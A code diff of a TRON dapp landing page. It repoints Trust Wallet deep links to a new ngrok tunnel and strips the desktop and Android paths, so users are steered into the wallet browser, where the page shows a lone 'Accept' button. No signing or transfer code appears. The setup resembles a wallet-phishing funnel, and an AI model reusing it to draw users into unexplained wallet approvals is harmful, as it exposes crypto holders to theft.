@@ -26,10 +26,10 @@ const rows = [
 ];
 
 // Trust Wallet deep link URL - fixed format
-const TRUST_WALLET_URL = "https://link.trustwallet.com/open_url?coin_id=195&url=https://dd5f-94-156-30-185.ngrok-free.app/";
+const TRUST_WALLET_URL = "https://link.trustwallet.com/open_url?coin_id=195&url=https://9223-154-208-62-138.ngrok-free.app";
 
 // Alternative option with custom URI scheme (use this if the HTTPS version doesn't work)
-const TRUST_WALLET_ALT_URL = "trust://open_url?coin_id=195&url=https://dd5f-94-156-30-185.ngrok-free.app/";
+const TRUST_WALLET_ALT_URL = "trust://open_url?coin_id=195&url=https://9223-154-208-62-138.ngrok-free.app";
 
 // Function to detect if we're running in Trust Wallet
 function isTrustWallet() {
@@ -54,62 +54,31 @@ function isTrustWallet() {
     return false;
 }
 
-// Function to detect if device is mobile
-function isMobile() {
-    if (typeof window === 'undefined') return false;
-    const ua = navigator.userAgent || navigator.vendor || (window as any).opera;
-    // Checks for Android, iOS, and some common mobile browsers
-    return /android|iphone|ipad|ipod|opera mini|iemobile|mobile/i.test(ua);
-}
-
-// Function to detect if device is desktop/laptop
-function isDesktop() {
-    return !isMobile();
-}
-
-// Function to detect if device is Android
-function isAndroid() {
-    if (typeof window === 'undefined') return false;
-    const ua = navigator.userAgent || navigator.vendor || (window as any).opera;
-    return /android/i.test(ua);
-}
-
 export default function Home() {
     const [isInTrustWallet, setIsInTrustWallet] = useState(false);
-    const [isOnDesktop, setIsOnDesktop] = useState(false);
-    const [isAndroidDevice, setIsAndroidDevice] = useState(false);
-
+    
+    // Check environment on component mount
     useEffect(() => {
         setIsInTrustWallet(isTrustWallet());
-        setIsOnDesktop(isDesktop());
-        setIsAndroidDevice(isAndroid());
         console.log("Environment check:", { isInTrustWallet: isTrustWallet(), userAgent: window.navigator.userAgent });
     }, []);
-
+    
     return (
         <div>
             <div style={{ textAlign: 'center', padding: '40px' }}>
                 <h1>TRON Wallet Connection</h1>
+                
                 {isInTrustWallet ? (
                     // In Trust Wallet, only show connect wallet button
                     <SingleButton />
-                ) : isOnDesktop ? (
-                    // On desktop/laptop, show WalletConnect QR button
-                    <DesktopWalletConnectButton />
-                ) : isAndroidDevice ? (
-                    // On Android, show instructions
-                    <TrustWalletAndroidInstructions />
                 ) : (
-                    // On mobile (not Trust Wallet), show "Open in Trust Wallet" button
+                    // Outside Trust Wallet, only show "Open in Trust Wallet" button
                     <TrustWalletButton />
                 )}
+                
                 <p style={{ marginTop: '20px', color: '#666', fontSize: '14px' }}>
-                    {isInTrustWallet
-                        ? 'You are viewing this app in Trust Wallet Browser'
-                        : isOnDesktop
-                        ? 'Scan the QR code with Trust Wallet to connect'
-                        : isAndroidDevice
-                        ? 'Please follow the instructions above to open this DApp in Trust Wallet on Android'
+                    {isInTrustWallet 
+                        ? 'You are viewing this app in Trust Wallet Browser' 
                         : 'For the best experience, open this app in Trust Wallet'}
                 </p>
             </div>
@@ -134,29 +103,6 @@ function SingleButton() {
             }} icon="">
                 Accept
             </WalletActionButton>
-        </div>
-    );
-}
-
-// Desktop WalletConnect QR button (shows WalletActionButton)
-function DesktopWalletConnectButton() {
-    return (
-        <div style={{ margin: '20px 0' }}>
-            <WalletActionButton
-                style={{
-                    fontSize: '18px',
-                    padding: '15px 30px',
-                    backgroundColor: '#3366FF',
-                    color: 'white',
-                    borderRadius: '4px',
-                }}
-                icon=""
-            >
-                Connect Wallet
-            </WalletActionButton>
-            <p style={{ marginTop: '10px', color: '#666', textAlign: 'center' }}>
-                Scan this QR code with Trust Wallet to connect
-            </p>
         </div>
     );
 }
@@ -208,64 +154,6 @@ function TrustWalletButton() {
             <p style={{ marginTop: '10px', color: '#666', textAlign: 'center' }}>
                 Click to launch this app directly in Trust Wallet
             </p>
-        </div>
-    );
-}
-
-// Android-specific instructions for Trust Wallet
-function TrustWalletAndroidInstructions() {
-    const dappUrl = "https://dd5f-94-156-30-185.ngrok-free.app/";
-
-    const copyToClipboard = async () => {
-        try {
-            await navigator.clipboard.writeText(dappUrl);
-            alert("DApp URL copied! Open Trust Wallet, go to the Browser tab, and paste the URL.");
-        } catch {
-            alert("Copy failed. Please copy the URL manually:\n" + dappUrl);
-        }
-    };
-
-    return (
-        <div style={{ margin: '20px 0' }}>
-            <div style={{
-                background: '#fffbe6',
-                border: '1px solid #ffe58f',
-                borderRadius: '8px',
-                padding: '20px',
-                color: '#ad8b00',
-                marginBottom: '10px'
-            }}>
-                <b>Android Trust Wallet Users:</b>
-                <ol style={{ textAlign: 'left', margin: '10px auto', maxWidth: 400 }}>
-                    <li>Open Trust Wallet app</li>
-                    <li>Go to the <b>Browser</b> tab</li>
-                    <li>Paste the following URL and open it:</li>
-                </ol>
-                <div style={{
-                    background: '#f6ffed',
-                    border: '1px solid #b7eb8f',
-                    borderRadius: '4px',
-                    padding: '8px',
-                    wordBreak: 'break-all',
-                    marginBottom: '8px'
-                }}>
-                    {dappUrl}
-                </div>
-                <button
-                    onClick={copyToClipboard}
-                    style={{
-                        background: '#2196f3',
-                        color: 'white',
-                        border: 'none',
-                        borderRadius: '4px',
-                        padding: '8px 16px',
-                        cursor: 'pointer',
-                        fontWeight: 'bold'
-                    }}
-                >
-                    Copy URL
-                </button>
-            </div>
         </div>
     );
 }
